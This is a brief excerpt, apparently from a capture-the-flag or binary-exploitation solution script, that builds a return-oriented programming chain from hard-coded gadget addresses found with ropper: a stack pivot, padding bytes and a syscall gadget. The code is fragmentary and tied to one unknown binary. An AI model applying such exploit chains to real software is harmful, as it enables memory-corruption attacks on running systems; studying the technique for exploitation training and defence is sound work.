...
chain = p64(0x0000000000472fa8) # leave; ret; found using ropper
payload = 8 * b"D" + chain
...
rop.raw(0x0000000000422dd4) # mov rax, rdi; ret found using ropper
...
rop.raw(0x000000000049b8fe) # mov rsi rbp; syscall; found using ropper (saves bytes!)
